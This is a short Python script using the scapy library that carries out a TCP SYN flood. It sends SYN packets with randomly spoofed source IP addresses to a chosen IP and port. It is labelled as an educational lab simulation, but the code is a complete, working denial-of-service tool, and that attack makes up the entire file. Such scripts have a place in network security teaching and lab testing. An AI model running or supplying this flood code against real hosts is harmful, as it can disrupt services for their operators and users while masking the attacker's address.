from scapy.all import *
import random

def syn_flood(target_ip="192.168.1.100", target_port=80, count=100):
    print(f"[EDU] Simulating SYN Flood on {target_ip}:{target_port}")
    for _ in range(count):
        src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        packet = IP(src=src_ip, dst=target_ip) / TCP(sport=random.randint(1024,65535), dport=target_port, flags="S")
        send(packet, verbose=0)
    print("[+] Simulation complete. Check Wireshark.")

if __name__ == "__main__":
    syn_flood()  # CHANGE IP TO YOUR LAB SERVER